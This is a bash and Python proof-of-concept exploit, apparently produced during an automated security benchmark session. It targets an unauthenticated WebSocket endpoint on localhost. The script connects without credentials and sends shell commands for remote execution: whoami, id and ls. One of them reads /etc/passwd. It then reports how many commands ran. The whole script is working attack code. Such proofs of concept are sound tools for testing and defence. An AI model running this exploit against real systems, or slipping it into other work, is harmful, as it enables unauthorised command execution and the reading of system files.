#!/bin/bash
# POC: POC for unauthenticated WebSocket RCE - connects to ws://localhost:22222/ws and executes arbitrary commands
# Target: ./repo
# Created: 2025-11-07T21:55:46.204Z
# Session: benchmark-XBEN-083-24-mhpe40z0

# Unauthenticated WebSocket RCE POC
# Demonstrates arbitrary command execution via ws://localhost:22222/ws

TARGET_WS="${1:-ws://localhost:22222/ws}"
echo "[*] Testing WebSocket RCE at: $TARGET_WS"
echo ""

# Check if python3 is available
if ! command -v python3 &> /dev/null; then
    echo "[-] python3 not found"
    exit 1
fi

# Create and run Python test script
python3 << 'PYTHON_EOF'
import websocket
import sys
import time

target_ws = "ws://localhost:22222/ws"

# List of commands to test
test_commands = [
    "whoami",
    "id",
    "pwd",
    "ls -la /tmp",
    "echo VULNERABILITY_CONFIRMED",
    "head -3 /etc/passwd"
]

try:
    print("[*] Attempting to connect to WebSocket without authentication...")
    ws = websocket.create_connection(target_ws, timeout=5)
    print("[+] Successfully connected (no authentication required!)")
    print("[+] VULNERABILITY CONFIRMED: Unauthenticated access achieved")
    print("")
    
    success_count = 0
    for cmd in test_commands:
        try:
            print(f"[>] Executing command: {cmd}")
            ws.send(cmd)
            
            # Wait for response
            time.sleep(0.5)
            response = ws.recv()
            
            if response:
                print(f"[+] Command output received:")
                print(f"    {response[:100]}")
                success_count += 1
            print("")
        except Exception as e:
            print(f"[-] Error executing command: {e}")
            continue
    
    ws.close()
    
    if success_count > 0:
        print(f"[+] Successfully executed {success_count}/{len(test_commands)} commands")
        print("[+] CRITICAL: Arbitrary command execution confirmed!")
        sys.exit(0)
    else:
        print("[-] No commands executed successfully")
        sys.exit(1)
        
except ConnectionRefusedError:
    print("[-] Connection refused - WebSocket service not available")
    sys.exit(1)
except Exception as e:
    print(f"[-] Error: {e}")
    sys.exit(1)

PYTHON_EOF

exit $?